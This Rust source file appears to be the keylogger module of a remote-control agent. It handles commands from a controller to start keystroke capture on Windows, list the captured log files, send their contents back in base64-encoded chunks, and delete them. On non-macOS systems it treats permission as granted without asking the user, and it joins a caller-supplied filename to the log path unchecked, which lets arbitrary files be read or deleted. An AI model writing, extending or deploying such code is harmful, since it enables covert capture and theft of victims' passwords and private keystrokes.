use std::{
    fs,
    path::{Path, PathBuf},
    sync::atomic::{AtomicBool, Ordering},
};

use base64::{Engine as _, engine::general_purpose::STANDARD};

use crate::{
    commands::Ctx,
    protocol::{self, Obj},
};

pub struct Keylogger {
    directory: PathBuf,
    granted: AtomicBool,
}

impl Keylogger {
    pub fn new(state_dir: PathBuf) -> Self {
        Self {
            directory: state_dir.join("logs"),
            granted: AtomicBool::new(cfg!(windows) || !cfg!(target_os = "macos")),
        }
    }

    pub fn start(&self) -> Result<PathBuf, String> {
        #[cfg(windows)]
        {
            let path = crate::win::keylog::start(&self.directory)?;
            self.granted.store(true, Ordering::Relaxed);
            Ok(path)
        }
        #[cfg(not(windows))]
        {
            fs::create_dir_all(&self.directory).map_err(|error| error.to_string())?;
            Ok(self.directory.clone())
        }
    }

    pub fn stop(&self) {
        #[cfg(windows)]
        crate::win::keylog::stop();
    }

    pub fn granted(&self) -> bool {
        self.granted.load(Ordering::Relaxed)
    }

    pub fn directory(&self) -> &Path {
        &self.directory
    }
}

fn file_list(directory: &Path) -> Vec<protocol::Value> {
    let mut files = Vec::new();
    let Ok(entries) = fs::read_dir(directory) else {
        return files;
    };
    for entry in entries.flatten() {
        let _path = entry.path();
        let Ok(metadata) = entry.metadata() else { continue };
        if !metadata.is_file() {
            continue;
        }
        let modified = metadata
            .modified()
            .ok()
            .map(chrono::DateTime::<chrono::Local>::from)
            .map(|value| value.to_rfc3339())
            .unwrap_or_default();
        files.push(
            Obj::new()
                .put(
                    protocol::key_name(),
                    protocol::s(&entry.file_name().to_string_lossy()),
                )
                .put(protocol::key_size(), protocol::n(metadata.len() as i64))
                .put(protocol::key_at(), protocol::s(&modified))
                .value(),
        );
    }
    files
}

pub async fn handle(ctx: Ctx) {
    let keylogger = &ctx.state.keylogger;
    match ctx.command.name.as_str() {
        "keylog_request_permission" => {
            let (granted, reason) = if cfg!(target_os = "macos") {
                (false, "user_denied")
            } else if keylogger.granted() {
                (true, "granted")
            } else {
                match keylogger.start() {
                    Ok(_) => (true, "granted"),
                    Err(_) => (false, "start_failed"),
                }
            };
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("keylog_permission_result"))
                        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                        .put(protocol::key_granted(), protocol::b(granted))
                        .put(protocol::key_reason(), protocol::s(reason))
                        .value(),
                )
                .await;
        }
        "keylog_list" => {
            if !keylogger.granted() {
                ctx.out
                    .result(&ctx.command, false, Some("keylogger is not enabled"))
                    .await;
                return;
            }
            #[cfg(windows)]
            {
                if !crate::win::keylog::is_running() {
                    if keylogger.start().is_err() {
                        ctx.out
                            .result(&ctx.command, false, Some("keylogger start failed"))
                            .await;
                        return;
                    }
                }
            }
            let files = file_list(keylogger.directory());
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("keylog_file_list"))
                        .put(protocol::key_files(), protocol::arr(files))
                        .value(),
                )
                .await;
        }
        "keylog_retrieve" => {
            let filename = ctx.string("filename").unwrap_or("");
            let path = keylogger.directory().join(filename);
            let data = match fs::read(&path) {
                Ok(data) => data,
                Err(_) => {
                    ctx.out
                        .result(&ctx.command, false, Some("log file not found"))
                        .await;
                    return;
                }
            };
            if data.len() <= 256 * 1024 {
                ctx.out
                    .send(
                        Obj::new()
                            .put(protocol::key_type(), protocol::s("keylog_file_content"))
                            .put(protocol::key_filename(), protocol::s(filename))
                            .put(protocol::key_content(), protocol::s(&String::from_utf8_lossy(&data)))
                            .value(),
                    )
                    .await;
            } else {
                let chunks: Vec<&[u8]> = data.chunks(256 * 1024).collect();
                let total = chunks.len();
                for (index, chunk) in chunks.iter().enumerate() {
                    ctx.out
                        .send(
                            Obj::new()
                                .put(protocol::key_type(), protocol::s("keylog_file_chunk"))
                                .put(protocol::key_filename(), protocol::s(filename))
                                .put(protocol::key_chunk(), protocol::n(index as i64))
                                .put(protocol::key_total(), protocol::n(total as i64))
                                .put(
                                    protocol::key_content(),
                                    protocol::s(&STANDARD.encode(chunk)),
                                )
                                .put(protocol::key_is_last(), protocol::b(index + 1 == total))
                                .put(protocol::key_is_encoded(), protocol::b(true))
                                .value(),
                        )
                        .await;
                }
                ctx.out
                    .send(
                        Obj::new()
                            .put(protocol::key_type(), protocol::s("keylog_file_content"))
                            .put(protocol::key_filename(), protocol::s(filename))
                            .put(protocol::key_content(), protocol::s(&String::from_utf8_lossy(&data)))
                            .value(),
                    )
                    .await;
            }
        }
        "keylog_clear_all" => {
            let mut ok = true;
            if let Ok(entries) = fs::read_dir(keylogger.directory()) {
                for entry in entries.flatten() {
                    if entry.path().is_file() && fs::remove_file(entry.path()).is_err() {
                        ok = false;
                    }
                }
            }
            let mut object = Obj::new()
                .put(protocol::key_type(), protocol::s("keylog_clear_result"))
                .put(protocol::key_ok(), protocol::b(ok));
            if !ok {
                object = object
                    .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                    .put(protocol::key_error(), protocol::s("some log files could not be removed"));
            }
            ctx.out.send(object.value()).await;
        }
        "keylog_delete" => {
            let filename = ctx.string("filename").unwrap_or("");
            let path = keylogger.directory().join(filename);
            let result = fs::remove_file(&path);
            let mut object = Obj::new()
                .put(protocol::key_type(), protocol::s("keylog_delete_result"))
                .put(protocol::key_ok(), protocol::b(result.is_ok()))
                .put(protocol::key_filename(), protocol::s(filename));
            if let Err(error) = result {
                object = object.put(protocol::key_error(), protocol::s(&error.to_string()));
            }
            ctx.out.send(object.value()).await;
        }
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unknown keylogger command"))
                .await;
        }
    }
}
